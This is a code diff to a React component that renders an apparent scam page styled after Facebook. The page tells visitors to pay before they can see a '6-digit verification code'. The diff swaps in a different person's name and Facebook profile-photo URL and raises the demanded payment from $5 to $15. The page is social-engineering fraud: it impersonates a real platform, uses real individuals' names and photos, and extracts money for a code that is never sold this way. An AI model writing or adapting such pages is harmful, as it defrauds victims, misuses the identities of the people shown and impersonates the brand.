@@ -4,9 +4,9 @@ export default function SixDigit() {
     const code = '******';
 
     const fbUser = {
-        name: 'Nur Alam',
+        name: 'Sanjida Mim',
         profilePic:
-            'https://scontent.frjh7-1.fna.fbcdn.net/v/t39.30808-6/503361550_706415692325595_1281669552417602155_n.jpg?_nc_cat=104&ccb=1-7&_nc_sid=6ee11a&_nc_eui2=AeERBpcuzoKwzKChFzBmXEnKtToS8vty-ju1OhLy-3L6O9GtQjXWTaLoGLC3MznjLSfZG6miz8t5t0DqXFpmDTFf&_nc_ohc=B5ndg-8VbFYQ7kNvwHPcGmp&_nc_oc=Adkzqk61TNzhOI32P59woUd-xn2_OCYJimiHqd_tyhRwMiPMaUmBRDS8v8RamVh6eRrqJ9fzjsFgHWbmW0rgkpuG&_nc_zt=23&_nc_ht=scontent.frjh7-1.fna&_nc_gid=rYKGZwIZeK7V_4JEhktVdQ&oh=00_AfPN3Ww_ijCdHzd_C60maIPcI9bD7Y4DuQo5Jw2tzS1Xow&oe=6859A7CC',
+            'https://scontent.frjh7-1.fna.fbcdn.net/v/t1.6435-9/36795511_117304302517433_2255713804497190912_n.jpg?_nc_cat=109&ccb=1-7&_nc_sid=6ee11a&_nc_eui2=AeGQ0TyHWrYJpNHXasnPebu2YHNYsNC5a8xgc1iw0LlrzCUJrFXqJLL0wo-URWLCVQ70kHnpu3U1rVWd1ITTLtZk&_nc_ohc=xiBHGY_rNr0Q7kNvwFo8iRW&_nc_oc=AdkoIO7kr4Ny-vTpfh9fBDHA8YloPqg56m8uNvIxzf_OBoXWC-AsA5OB7cpJ4_1-AnkDUEDQmKO4pr7py107W5_F&_nc_zt=23&_nc_ht=scontent.frjh7-1.fna&_nc_gid=Yby6jWOAxYt-0Bh4xJNqBw&oh=00_AfOqfkoySiaVLjjOgw1EJMS5xor-w3Y_kTYi9eAm9IMLSQ&oe=687B5270',
     };
 
     return (
@@ -28,7 +28,7 @@ export default function SixDigit() {
                     Unlock Your Verification Code
                 </h1>
                 <p className="text-gray-700 text-sm mb-6">
-                    A $5 payment is required to access your secure 6-digit verification code.
+                    A $15 payment is required to access your secure 6-digit verification code.
                 </p>
 
                 <div className="mb-6">
@@ -51,7 +51,7 @@ export default function SixDigit() {
                 </div>
 
                 <button className="w-full bg-[#1877f2] text-white font-medium py-3 rounded-full text-base mb-3 hover:bg-[#155fca] transition">
-                    Pay $5 to Reveal 6-Digit Code
+                    Pay $15 to Reveal 6-Digit Code
                 </button>
 
 
